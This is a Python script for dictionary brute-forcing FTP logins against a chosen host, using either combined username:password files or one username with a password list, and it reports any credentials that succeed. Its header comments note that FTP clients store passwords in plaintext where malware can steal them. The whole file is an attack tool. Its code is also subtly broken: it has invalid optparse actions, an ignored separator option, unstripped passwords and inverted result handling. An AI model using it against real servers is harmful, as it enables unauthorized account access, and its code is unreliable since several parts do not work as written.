#FTP Client programs, such as FileZilla, often store passwords in plaintext configuration files
#Storing passwords in cleartext in a default location allows custom malware to quickly steal credentials

import optparse
import ftplib
import sys

def brute1(hostname, passwordfile,sepchar=':'):
    pf=open(passwordfile, 'r')
    for line in pf.readlines():
        username=line.split(':')[0]
        password=line.split(':')[1]
        try:
            print('Trying username '+username+' and Password '+password)
            ftp=ftplib.FTP(hostname)
            ftp.login(username, password)
            print('Login Success with username '+ username+ ' and password '+password)
            ftp.quit()
            return(username, password)
        except:
            pass
    print('Could not bruteforce FTP')
def brute2(hostname, username, passwordfile):
    pf=open(passwordfile, 'r')
    for line in pf.readlines():
        password=line.strip('\n')
        try:
            print('Trying username '+username+' and Password '+password)
            ftp=ftplib.FTP(hostname)
            ftp.login(username, password)
            print('Login Success with username '+ username+ ' and password '+password)
            ftp.quit()
            return(username, password)
        except:
            pass
    print('Could not bruteforce FTP')
def main():
    userpass=[None, None]
    usage = "usage: python3 ftp_brute [options] argument use -h for help"
    parser=optparse.OptionParser(usage=usage)
    parser.add_option('-m', dest='mode', type='string', help='Specify Mode you want to use. -m 1 for passsword file with username and password separated by : and -m 2 for entering one username and corresponding password file')
    parser.add_option('-H', dest='hostname', type='string', help='Specify hostname')
    parser.add_option('-f', dest='passwd', type='string', help='Specify dictionary file')
    parser.add_option('-u', dest='username', action="string", help='When using -m 2, use this option for username' )
    parser.add_option('-s', dest='sepchar', action="string", help='Optional argument - When using -m 1, use this option for charachter separating username and password' )
    (options, args)=parser.parse_args()
    username=options.username
    hostname=options.hostname
    passwd=options.passwd
    sepchar=options.sepchar
    mode=options.mode
    if (mode == '1'):
        if (sepchar== None):
            userpass=brute1(hostname, passwd)
        else:
            userpass= brute1(hostname, passwd, sepchar)
    if (mode == '2'):
        userpass= brute2(hostname, username, passwd)
    if not(userpass[1]==None) and (userpass[0]== None):
        print('The password has been saved in variable userpass '+ userpass)
    exit(0)

main()
